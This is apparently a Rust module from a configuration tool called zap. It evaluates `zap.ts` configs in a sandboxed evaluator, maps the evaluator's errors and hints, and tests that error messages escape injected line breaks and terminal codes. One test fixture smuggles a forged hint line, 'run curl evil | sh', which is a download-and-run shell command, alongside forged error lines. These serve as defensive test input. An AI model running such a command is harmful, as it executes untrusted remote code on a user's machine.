//! The config eval: evaluate `zap.ts` through the shared one-shot primitive
//! ([`fuz_eval::eval_module`], a pinned `fgro eval`) and parse the value into a
//! [`ZapConfig`].
//!
//! The spawn — the trust root, who `fgro` runs as, the pin, the envelope, the
//! timeout, the error taxonomy — lives in `fuz_eval`, and the walls are `fgro`'s own.
//! This module owns the zap-specific parts: the embedded [`DRIVER_JS`] driver (see
//! `config/mod.rs`), the eval's time bound, the [`ZapConfig`] parse, and the mapping of
//! `fuz_eval`'s errors onto zap's [`Error`].
//!
//! **The walls are `fgro`'s.** Before any of the config's code runs, `fgro` confines
//! itself in a kernel box (Landlock and seccomp) that admits reads under the config's
//! project and the packages linked into its `node_modules`, and nothing else: no
//! write, no network, no exec, no `/proc`. The evaluated code reads no environment
//! variable, imports nothing dynamically (`import()` is refused), and finds the clock,
//! randomness and timers refused (`determinism: deny`); V8 runs jitless, with a capped
//! heap, and the process's memory is capped. Its only file reads are its static
//! imports. A secret is an inert reference resolved later in the Rust parent, so there
//! is none in the evaluation to read.
//!
//! **The project is the trust root.** `fuz_eval` walks up from the config through the
//! directories its owner (under `sudo`, also the invoking user) holds and no other user
//! can write, to the first whose `package.json` holds more than a `"type"` /
//! `"sideEffects"` marker, and refuses the eval when it finds none
//! ([`Error::ConfigTrustRoot`]): a config needs a project of its own. `fgro` never runs
//! as root: under `sudo` it drops to the project's owner ([`Error::ConfigRunAs`]). The
//! rules and what they leave are `fuz_eval`'s crate docs.
//!
//! Determinism caveat: the driver refuses the ambient inputs its tables name, and
//! `fgro` refuses the rest, so the same files declare the same thing on every machine.
//! What varies is what the project's files say, which is the config's own content.

use std::borrow::Cow;
use std::fmt::Write as _;
use std::path::{Path, PathBuf};
use std::time::Duration;

use fuz_eval::{EvalErrorKind, FgroProblem, GraphDump};
use zap_types::scalar::ContentHash;
use zap_types::schema::{WireError, ZapConfig};

use crate::config::DRIVER_JS;
use crate::error::{Error, Result};
use crate::escape::escape_line;

/// The time bound on a single config eval, passed to `fgro` as its `--timeout`.
///
/// A real eval is sub-second; this catches a pathological config (an infinite loop in
/// a builder call) rather than hanging the command. Generous, since `fgro` runs jitless.
pub const EVAL_TIMEOUT: Duration = Duration::from_secs(30);

/// Which `fgro` evaluates a config, and the blake3 it must hash to.
#[derive(Debug, Clone, Copy)]
pub struct PinnedFgro<'a> {
    /// The binary, as the operator named it (`--fgro`, `ZAP_FGRO`).
    pub path: &'a Path,
    /// The project's toolchain pin.
    pub pin: &'a ContentHash,
    /// The stat-keyed hash cache (`crate::config::fgro::pin_cache_dir`); `None` hashes
    /// the binary on every eval.
    pub pin_cache: Option<&'a Path>,
}

/// Evaluate a `zap.ts` config through the pinned `fgro` and parse the value into a
/// [`ZapConfig`].
///
/// # Errors
/// - [`Error::ConfigNotFound`] — `config_path` can't be resolved on disk.
/// - [`Error::ConfigTrustRoot`] — the config's project can't be settled: the config or
///   its directory is writable by every user, a `package.json` on the way up can't be
///   read or isn't valid, or no `package.json` sets a project.
/// - [`Error::ConfigRunAs`] — there is no user `fgro` may run as.
/// - [`Error::FgroUnusable`], [`Error::FgroPinMismatch`] — the binary is missing, isn't
///   one that can run pinned, or doesn't hash to the pin.
/// - [`Error::ConfigEval`] — `fgro` reported a failure (a throwing config, an import
///   that doesn't resolve, a read outside the box, its timeout, …), by kind.
/// - [`Error::ConfigEvalTimeout`] — `fgro` didn't stop at its timeout and was killed.
/// - [`Error::ConfigEvalOutputTooLarge`] — `fgro` wrote more than the capture cap.
/// - [`Error::ConfigParse`] — the value didn't match the schema, a reference in a field
///   that takes none included ([`ZapConfig::from_wire`]).
/// - [`Error::FgroProtocolVersion`] — `fgro` answered in an eval protocol or graph
///   version this zap doesn't read.
/// - [`Error::FgroRun`], [`Error::ConfigIo`] — `fgro` crashed, broke its protocol, or
///   couldn't be spawned or talked to.
pub async fn eval_config(config_path: &Path, fgro: PinnedFgro<'_>) -> Result<ZapConfig> {
    Ok(eval_config_raw(config_path, fgro).await?.config)
}

/// What [`eval_config_raw`] returns: the parsed config, the value it was parsed from,
/// the path that was evaluated, and the module graph the run loaded.
#[derive(Debug, Clone)]
pub struct EvaluatedConfig {
    /// The parsed config.
    pub config: ZapConfig,
    /// The value as JSON text, keys sorted, for persisting as the L0 eval-cache value.
    pub value_json: String,
    /// The canonical config path `fgro` evaluated (the envelope's `entry.id`).
    pub config_path: PathBuf,
    /// The module graph the run loaded — what the eval cache's manifest is captured
    /// from.
    pub graph: GraphDump,
    /// The blake3 of the `fgro` binary that evaluated: the pin it was verified against.
    pub fgro_blake3: ContentHash,
}

/// Like [`eval_config`], but also returns the value's JSON, the canonical path
/// evaluated, and its module graph ([`EvaluatedConfig`]).
///
/// # Errors
/// Same as [`eval_config`].
pub async fn eval_config_raw(config_path: &Path, fgro: PinnedFgro<'_>) -> Result<EvaluatedConfig> {
    let output = fuz_eval::eval_module(&fuz_eval::EvalRequest {
        config_path,
        driver_js: DRIVER_JS,
        timeout: EVAL_TIMEOUT,
        fgro: fuz_eval::FgroPin {
            path: fgro.path,
            expected_blake3: fgro.pin.as_str(),
            cache_dir: fgro.pin_cache,
        },
    })
    .await
    .map_err(map_eval_error)?;

    let config = ZapConfig::from_wire(&output.value_json).map_err(|source| Error::ConfigParse {
        path: output.config_path.display().to_string(),
        source: escaped(source),
    })?;
    Ok(EvaluatedConfig {
        config,
        value_json: output.value_json,
        config_path: output.config_path,
        graph: output.graph,
        fgro_blake3: fgro.pin.clone(),
    })
}

/// `error` with each finding escaped where the message is composed: a finding names a
/// resource by its id and a field by its path, both the config's own text, and one that
/// holds a line break would otherwise read as a finding of its own. A schema error
/// quotes the config too — an unknown variant, an unknown key — and is one line.
fn escaped(error: WireError) -> WireError {
    let each = |findings: Vec<String>| {
        findings
            .iter()
            .map(|finding| escape_line(finding).into_owned())
            .collect()
    };
    match error {
        WireError::Misplaced(findings) => WireError::Misplaced(each(findings)),
        WireError::Misshapen(findings) => WireError::Misshapen(each(findings)),
        WireError::Null(findings) => WireError::Null(each(findings)),
        WireError::Delimiter(path) => WireError::Delimiter(escape_line(&path).into_owned()),
        WireError::Parse(error) => {
            WireError::Parse(serde::de::Error::custom(escape_line(&error.to_string())))
        }
    }
}

/// Map a [`fuz_eval::EvalError`] to the engine's [`Error`] taxonomy.
///
/// Where `fuz_eval`'s message is used whole, it has escaped what `fgro` and the disk
/// wrote; zap's render escapes each line again, which leaves an escaped line as it is.
/// An eval failure is taken apart instead ([`Error::ConfigEval`]), so its hint, which
/// can name `fgro`'s own flags, is zap's to word.
pub(crate) fn map_eval_error(error: fuz_eval::EvalError) -> Error {
    use fuz_eval::{EvalError as E, ProtocolViolation as V};
    let version_mismatch = matches!(
        &error,
        E::Protocol { violation, .. }
            if matches!(**violation, V::ProtocolVersion { .. } | V::GraphVersion { .. })
    );
    match error {
        E::ConfigNotFound { path, source } => Error::ConfigNotFound { path, source },
        // The pin comes from the lock, parsed as a content hash, so a malformed one never
        // reaches fuz_eval; one that does is the lock's to fix, as a path that isn't
        // UTF-8 is the config's.
        error @ (E::ConfigPathNotUtf8 { .. } | E::InvalidPin { .. }) => {
            Error::Config(error.to_string())
        }
        E::Eval {
            path,
            failure,
            stderr,
        } => {
            let fuz_eval::EvalFailure {
                kind,
                message,
                at,
                specifier,
                importer,
                hint,
            } = *failure;
            // where it failed and the import, quoted as fuz_eval quotes them (Debug
            // form: escaped, in quotes), so a path or specifier can't pass for more
            // of the report
            let mut report = message;
            if let Some(at) = at {
                let _ = write!(report, "\n  at {at:?}");
            }
            match (specifier, importer) {
                (Some(specifier), Some(importer)) => {
                    let _ = write!(report, "\n  import {specifier:?} from {importer:?}");
                }
                (Some(specifier), None) => {
                    let _ = write!(report, "\n  import {specifier:?}");
                }
                (None, Some(importer)) => {
                    let _ = write!(report, "\n  from {importer:?}");
                }
                (None, None) => {}
            }
            Error::ConfigEval {
                path,
                kind,
                message: report,
                fgro_hint: hint,
                // a config's console output can be coloured for a terminal; the colour is
                // dropped, the text kept
                stderr: crate::escape::strip_sgr(&stderr).into_owned(),
            }
        }
        E::Timeout { path } => Error::ConfigEvalTimeout { path },
        E::OutputTooLarge { path, limit } => Error::ConfigEvalOutputTooLarge { path, limit },
        error @ E::TrustRoot { problem, .. } => Error::ConfigTrustRoot {
            problem,
            message: error.to_string(),
        },
        E::RunAs {
            path,
            root,
            problem,
        } => Error::ConfigRunAs {
            message: E::RunAs {
                path,
                root,
                problem: problem.clone(),
            }
            .to_string(),
            problem,
        },
        error @ E::FgroUnusable { problem, .. } => Error::FgroUnusable {
            problem,
            message: error.to_string(),
        },
        error @ E::PinMismatch { .. } => Error::FgroPinMismatch {
            message: error.to_string(),
        },
        error @ E::PinCacheDir { .. } => Error::FgroPinCache(error.to_string()),
        // A version this zap doesn't read is a build that doesn't match it: the operator's
        // to fix. Every other violation is fgro misbehaving, or (a project that moved
        // between the two walks) the disk changing under the eval: a retry may clear it.
        error @ E::Protocol { .. } if version_mismatch => Error::FgroProtocolVersion {
            message: error.to_string(),
        },
        error @ (E::Protocol { .. }
        | E::FgroCrashed { .. }
        | E::NotUtf8 { .. }
        | E::FgroIo { .. }
        | E::FgroSpawn { .. }) => Error::FgroRun(error.to_string()),
        E::Io(source) => Error::ConfigIo(source),
    }
}

/// The hint for an [`Error::ConfigEval`], in zap's words: `fgro`'s own, unless it names
/// one of `fgro`'s flags, which zap doesn't pass through, and a zap one by kind for
/// the kinds whose fix is zap's to say.
///
/// `fgro` gives a flag-naming hint for a jitless timeout (`--jit`, `--timeout`) and for
/// what a jitless eval lacks (`--jit` for `WebAssembly`, and in the note on code
/// generation from strings); a hint is matched only on whether it names one.
pub(crate) fn eval_hint(kind: EvalErrorKind, fgro_hint: Option<&str>) -> Option<Cow<'static, str>> {
    let names_a_flag = |hint: &str| hint.contains("--jit") || hint.contains("--timeout");
    match (kind, fgro_hint) {
        (EvalErrorKind::Timeout, _) => Some(Cow::Borrowed(TIMEOUT_HINT)),
        (_, Some(hint)) if names_a_flag(hint) => Some(Cow::Borrowed(JITLESS_HINT)),
        (_, Some(hint)) => Some(Cow::Owned(escape_line(hint).into_owned())),
        (EvalErrorKind::Resolve, None) => Some(Cow::Borrowed(RESOLVE_HINT)),
        (EvalErrorKind::Environment, None) => Some(Cow::Borrowed(ENVIRONMENT_HINT)),
        (EvalErrorKind::Heap, None) => Some(Cow::Borrowed(HEAP_HINT)),
        (EvalErrorKind::Memory, None) => Some(Cow::Borrowed(MEMORY_HINT)),
        _ => None,
    }
}

/// The hint for an eval `fgro` stopped at its timeout.
const TIMEOUT_HINT: &str = "zap evaluates a config jitless, in V8's interpreter, and stops it \
                            after 30 s; neither is a setting. A config declares data: move \
                            heavy computation out of it, and write its results in as literals.";

/// The hint for what a jitless eval lacks.
const JITLESS_HINT: &str = "zap evaluates a config jitless: WebAssembly is absent, and code \
                            generation from strings (eval(), new Function()) throws. Write \
                            the code in the module itself.";

/// The hint for an eval whose config or an import didn't resolve.
const RESOLVE_HINT: &str = "Every static import must resolve from the config's project: a bare \
                            import from a package installed there (add it to package.json and \
                            run `npm install`), a relative one by its file name with the \
                            extension. `node:` built-ins and URLs don't resolve.";

/// The hint for an eval that reached `fgro`'s cap on its JS heap.
const HEAP_HINT: &str = "fgro caps an eval's JS heap, and the cap is fgro's, not a zap \
                         setting. A config declares data: build large data outside it, and \
                         keep only what zap needs in it.";

/// The hint for an eval that reached `fgro`'s cap on its process's memory outside the
/// heap, as a large `ArrayBuffer` does.
const MEMORY_HINT: &str = "fgro caps an eval's process memory, and the cap is fgro's, not a zap \
                           setting. A config declares data: keep large buffers (ArrayBuffer, \
                           typed arrays) out of it, and build large data outside it.";

/// The hint for a host that can't hold `fgro`'s sandbox.
const ENVIRONMENT_HINT: &str = "this host or process can't hold fgro's eval: it needs Linux with \
                                Landlock (ABI 6 or later) and seccomp, and a process it can \
                                confine (see fgro's message).";

/// The hint for an [`Error::FgroUnusable`], by what is wrong.
pub(crate) const fn fgro_unusable_hint(problem: FgroProblem) -> Option<&'static str> {
    match problem {
        FgroProblem::Symlink | FgroProblem::Script | FgroProblem::NotElf => {
            Some("Name the fgro binary itself in `--fgro` or `ZAP_FGRO`, not a link or a wrapper.")
        }
        FgroProblem::NotFound
        | FgroProblem::NotRegularFile
        | FgroProblem::SetId
        | FgroProblem::ProcUnavailable
        | FgroProblem::ChangedWhileHashing
        | FgroProblem::ChangedSincePin => None,
    }
}

#[cfg(test)]
mod tests {
    use zap_types::schema::{WireError, ZapConfig};

    use super::escaped;
    use crate::error::Error;

    /// A hint that names one of fgro's flags, which zap doesn't pass through, is
    /// zap's own instead; a timeout always gets zap's; any other hint of fgro's is
    /// kept, escaped.
    #[test]
    fn an_eval_hint_never_names_an_fgro_flag() {
        use fuz_eval::EvalErrorKind as K;
        for (kind, fgro, expected) in [
            (
                K::Timeout,
                Some("pass --jit or a longer --timeout"),
                Some(super::TIMEOUT_HINT),
            ),
            (K::Timeout, None, Some(super::TIMEOUT_HINT)),
            (
                K::ModuleThrew,
                Some("WebAssembly needs --jit"),
                Some(super::JITLESS_HINT),
            ),
            (
                K::Internal,
                Some("link the package"),
                Some("link the package"),
            ),
            (K::Internal, Some("a\u{1b}[2Kb"), Some("a<U+001B>[2Kb")),
            (K::Resolve, None, Some(super::RESOLVE_HINT)),
            (K::Heap, None, Some(super::HEAP_HINT)),
            (K::Memory, None, Some(super::MEMORY_HINT)),
            (K::ModuleThrew, None, None),
        ] {
            let hint = super::eval_hint(kind, fgro);
            assert_eq!(hint.as_deref(), expected, "{kind:?} {fgro:?}");
            if let Some(hint) = hint {
                assert!(
                    !hint.contains("--jit") && !hint.contains("--timeout"),
                    "{hint}"
                );
            }
        }
    }

    /// Where an eval failed and the import that failed are quoted, escaped, under the
    /// report: a quote or a line break in a path or a specifier stays inside its quotes.
    #[test]
    fn an_eval_failure_quotes_where_it_failed() {
        let failure = |at: Option<&str>, specifier: Option<&str>, importer: Option<&str>| {
            let error = super::map_eval_error(fuz_eval::EvalError::Eval {
                path: "/p/zap.ts".to_owned(),
                failure: Box::new(fuz_eval::EvalFailure {
                    kind: fuz_eval::EvalErrorKind::Resolve,
                    message: "cannot resolve".to_owned(),
                    at: at.map(str::to_owned),
                    specifier: specifier.map(str::to_owned),
                    importer: importer.map(str::to_owned),
                    hint: None,
                }),
                stderr: String::new(),
            });
            match error {
                Error::ConfigEval { message, .. } => message,
                other => panic!("expected ConfigEval, got {other:?}"),
            }
        };
        assert_eq!(
            failure(
                Some("$.a\"b"),
                Some("x\nerror: y"),
                Some("file:///p/zap.ts")
            ),
            "cannot resolve\n  at \"$.a\\\"b\"\n  import \"x\\nerror: y\" from \"file:///p/zap.ts\""
        );
        assert_eq!(
            failure(None, Some("x"), None),
            "cannot resolve\n  import \"x\""
        );
        assert_eq!(
            failure(None, None, Some("/cwd")),
            "cannot resolve\n  from \"/cwd\""
        );
    }

    /// An fgro answering in an eval protocol or graph version this zap doesn't read is
    /// needs-action with a hint, its message `fuz_eval`'s; any other violation of the
    /// protocol is fgro misbehaving, exit 1.
    #[test]
    fn a_protocol_version_fgro_doesnt_speak_is_needs_action() {
        use fuz_eval::ProtocolViolation as V;
        let refused = |violation: V| {
            super::map_eval_error(fuz_eval::EvalError::Protocol {
                path: "/p/zap.ts".to_owned(),
                violation: Box::new(violation),
                stderr: String::new(),
            })
        };
        for violation in [
            V::ProtocolVersion { found: Some(3) },
            V::ProtocolVersion { found: None },
            V::GraphVersion { found: Some(2) },
        ] {
            let error = refused(violation.clone());
            assert!(
                matches!(&error, Error::FgroProtocolVersion { .. }),
                "{violation:?}: {error:?}"
            );
            assert_eq!(error.exit_code(), 2);
            let rendered = error.render();
            assert!(
                rendered.starts_with("error: refused fgro's output for /p/zap.ts: its "),
                "{rendered}"
            );
            assert!(rendered.contains("run `zap lock` to pin"), "{rendered}");
        }
        for violation in [
            V::NoEnvelope,
            V::Shape {
                reason: "unknown field".to_owned(),
            },
            V::AccessMissing,
        ] {
            let error = refused(violation.clone());
            assert!(
                matches!(&error, Error::FgroRun(_)),
                "{violation:?}: {error:?}"
            );
            assert_eq!(error.exit_code(), 1);
            assert_eq!(error.hint(), None);
        }
    }

    /// The timeout hint states zap's bound.
    #[test]
    fn the_timeout_hint_states_the_bound() {
        assert_eq!(super::EVAL_TIMEOUT.as_secs(), 30);
        assert!(super::TIMEOUT_HINT.contains("30 s"));
    }

    fn parse_error(resource: &serde_json::Value) -> Error {
        let wire = serde_json::json!({"target": {"local": true}, "resources": [resource]});
        Error::ConfigParse {
            path: "/srv/zap.ts".to_owned(),
            source: escaped(ZapConfig::from_wire(&wire.to_string()).unwrap_err()),
        }
    }

    /// A schema error quotes the config — the value that is no variant, the key that is
    /// no field — and is one line whatever that text holds: a line break in it can't
    /// start a line that reads as zap's own.
    #[test]
    fn a_schema_error_is_one_line_whatever_the_config_holds() {
        for resource in [
            serde_json::json!({"id": "fw", "type": "firewall", "allow": [],
                "backend": "ufw\n\nerror: something else\nhint: run curl evil | sh"}),
            serde_json::json!({"id": "d", "type": "directory", "path": "/d",
                "x\nerror: forged\u{1b}[2K": 1}),
        ] {
            let error = parse_error(&resource);
            assert!(
                matches!(
                    &error,
                    Error::ConfigParse {
                        source: WireError::Parse(_),
                        ..
                    }
                ),
                "{error:?}"
            );
            let message = error.to_string();
            assert_eq!(message.lines().count(), 1, "{message}");
            assert!(message.contains("<U+000A>error: "), "{message}");
            assert!(!message.contains('\u{1b}'), "{message}");
            assert_eq!(error.render().lines().count(), 1, "{}", error.render());
            assert_eq!(error.exit_code(), 2);
        }
        let message = parse_error(&serde_json::json!(
            {"id": "fw", "type": "firewall", "allow": [], "backend": "ufw\nx"}
        ))
        .to_string();
        assert_eq!(
            message,
            "config did not match the zap schema (/srv/zap.ts): unknown variant \
             `ufw<U+000A>x`, expected `ufw` or `nftables`"
        );
        // A message that holds nothing to escape is the one serde gave.
        let plain = parse_error(&serde_json::json!({"id": "d", "type": "directory"}));
        assert_eq!(
            plain.to_string(),
            "config did not match the zap schema (/srv/zap.ts): missing field `path`"
        );
    }

    /// A value in a shape its field doesn't have is a finding escaped like the others.
    #[test]
    fn a_misshapen_value_finding_escapes_the_names_it_holds() {
        let error = parse_error(&serde_json::json!(
            {"id": "f\n  - forged", "type": "file", "path": "/f", "content": ["inline", "x"]}
        ));
        assert_eq!(
            error.to_string(),
            "config did not match the zap schema (/srv/zap.ts): resource `f<U+000A>  - \
             forged`: `content` is an array where an object goes; zap reads an object by its \
             keys, never by position"
        );
        assert_eq!(error.exit_code(), 2);
    }
}
